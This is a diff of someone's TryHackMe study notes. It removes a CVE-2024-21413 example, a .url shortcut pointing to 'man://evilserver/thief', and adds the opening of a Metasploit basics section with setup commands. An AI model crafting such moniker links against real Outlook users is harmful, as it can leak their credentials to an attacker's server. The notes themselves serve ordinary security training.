@@ -1474,7 +1474,27 @@ This TryHackMe room covers **CVE-2024-21413**, a vulnerability affecting Microso
 
 Create a `.url` file containing a moniker link:
 
-```ini
-[InternetShortcut]
-URL=man://evilserver/thief
 
+# 🛠️ TryHackMe: Metasploit Basics
+
+> **Module URL**: [https://tryhackme.com/module/metasploit](https://tryhackme.com/module/metasploit)
+
+## 📚 Overview
+
+Metasploit is a powerful open-source framework for penetration testing, enabling security professionals to identify, exploit, and validate vulnerabilities. This module introduces the core functionalities of Metasploit, guiding users through its various components and practical applications.
+
+---
+
+## 🧩 Task 1: Introduction
+
+Metasploit, maintained by Rapid7, is a collection of tested exploits, auxiliary modules, and post-exploitation tools. It's widely used in the cybersecurity community for its versatility and effectiveness.
+
+---
+
+## ⚙️ Task 2: Initializing the Environment
+
+Before diving into Metasploit, ensure the database is initialized and the console is ready:
+
+```bash
+msfdb init
+msfconsole -q
